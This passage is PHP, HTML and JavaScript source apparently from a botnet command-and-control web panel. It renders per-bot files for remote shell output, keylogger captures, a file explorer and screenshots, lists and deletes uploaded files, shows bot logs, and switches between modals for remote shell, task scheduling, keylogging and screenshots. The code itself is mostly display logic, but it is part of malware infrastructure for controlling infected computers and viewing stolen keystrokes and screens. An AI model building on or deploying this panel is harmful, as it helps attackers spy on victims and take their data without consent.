                                        echo '<input type="hidden" id="file_name" name="file_name" value="'.$remote_shell_file.'">';
                                        echo '<a href="'.$remote_shell_file.'" target="_blank">'.$remote_shell_file."</a>";
                                        echo "<button type='submit' name='file_manager_delete_file'>Delete</button>";
                                    echo "</form>";
                                }

                                if(file_exists($bot_keylogger_file)) {

                                    echo "<form action='#' method='POST'>";
                                        echo '<input type="hidden" id="file_name" name="file_name" value="'.$bot_keylogger_file.'">';
                                        echo '<a href="'.$bot_keylogger_file.'" target="_blank">'.$bot_keylogger_file."</a>";
                                        echo "<button type='submit' name='file_manager_delete_file'>Delete</button>";
                                    echo "</form>";
                                }

                                if(file_exists($bot_file_explorer)) {

                                    echo "<form action='#' method='POST'>";
                                        echo '<input type="hidden" id="file_name" name="file_name" value="'.$bot_file_explorer.'">';
                                        echo '<a href="'.$bot_file_explorer.'" target="_blank">'.$bot_file_explorer."</a>";
                                        echo "<button type='submit' name='file_manager_delete_file'>Delete</button>";
                                    echo "</form>";
                                }
                                
                                if(file_exists($bot_screenshot_file)) {

                                    echo "<form action='#' method='POST'>";
                                        echo '<input type="hidden" id="file_name" name="file_name" value="'.$bot_screenshot_file.'">';
                                        echo '<a href="'.$bot_screenshot_file.'" target="_blank">'.$bot_screenshot_file."</a>";
                                        echo "<button type='submit' name='file_manager_delete_file'>Delete</button>";
                                    echo "</form>";
                                }

                                if(!is_dir_empty("uploads"))
                                {
                                    echo "<h1>Global Uploads:</h1>";

                                    // output all files and directories except for '.' and '..'
                                    foreach (new DirectoryIterator('uploads') as $fileInfo)
                                    {
                                        if($fileInfo->isDot()) continue;

                                        $file = "uploads\\".$fileInfo->getFilename();

                                        echo "<form action='#' method='POST'>";
                                            echo '<input type="hidden" id="file_name" name="file_name" value="'.$file.'">';
                                            echo '<a href="'.$file.'" target="_blank">'.$file."</a>";
                                            echo "<button type='submit' name='file_manager_delete_file'>Delete</button>";
                                        echo "</form>";

                                    }
                                }

                        ?>

                       
                    </div>

                    <div class="space_hr">
                            <hr>
                        </div>

                        <div class="upload_file">

                                <form action="#" method="POST" enctype="multipart/form-data">

                                    <label>Select file to upload</label>
                                    <input type="file" name="fileToUpload" id="fileToUpload">
                                    <input type="submit" class="upload_file_button" value="Upload Image" name="file_manager_upload_file">

                                </form>

                        </div>
                </div>
        </div>
    </div>

    <div class="bot_logs" id="bot_logs_id">

        <div class="title">
            LOGS
        </div>

        <div class="logs" id="logs_id">

            
                <?php 

                    if(file_exists($bot_logs_file) == false)
                    {
                        file_put_contents($bot_logs_file, "");
                    }
                
                    $hFile = fopen($bot_logs_file, "r");
                    if ($hFile)
                    {
                        if(filesize($bot_logs_file))
                        {
                            while (($line = fgets($hFile)) !== false) 
                            {
                                if($line == "")
                                    echo "<br>";
                                else
                                {
                                    echo "<div class='log_line'>";
                                        echo $line;
                                    echo "</div><br>";
                                }
                                
                            }
                        }
                        else
                        {
                            echo "<div class='no_history'>";
                                echo "<h2> No Logs! </h2>";
                            echo "</div>";
                        }
                    
                        fclose($hFile);
                    } 
                    else
                    {
                        echo  "Error opening the file.";
                    } 

                ?>

        </div>

    </div>

    <?php
        } // This is the end of the Bot is valid
    ?>

    <div class="bottom_div"></div>

    <footer>
        <a href="https://github.com/ElliotAlderson51" target="_blank">https://github.com/ElliotAlderson51</a>
    </footer>
    
</body>
</html>

<script>

        function refresh(div_to_load, div_to_scroll)
        {
           $("#" + div_to_load).load(location.href + " #" + div_to_load, function ()
            { 
                if(div_to_load != "file_explorer_id")
                {
                    var div = $("#" + div_to_scroll);
                    div.scrollTop($(div)[0].scrollHeight);
                }
            });
        }

        var div = $("#logs_id");
        div.scrollTop($(div)[0].scrollHeight);

        function show_modal(modal)
        {
            var data = document.getElementById(modal);
            data.style.display = "block";
            localStorage.setItem('name', modal);
        }

        function close_modal(modal)
        {
            var data = document.getElementById(modal);
            data.style.display = "none";
            localStorage.setItem('name', " ");
        }

        $(document).ready(function(){
            var name = localStorage.getItem('name');
            if(name === 'remote_shell_modal')
            {
                show_modal('remote_shell_modal');
            }
            else if(name === 'edit_info_modal')
            {
                show_modal('edit_info_modal');
            }
            else if(name === 'task_scheduler_modal')
            {
                show_modal('task_scheduler_modal');
            }
            else if(name === 'screenshot_modal')
            {
                show_modal('screenshot_modal');
            }
            else if(name === 'keylogger_modal')
            {
                show_modal('keylogger_modal');
            }
            else if(name === 'file_explorer_modal')
            {
                show_modal('file_explorer_modal');
            }
            else if(name === 'file_manager_modal')
            {
                show_modal('file_manager_modal');
            }

        });



</script>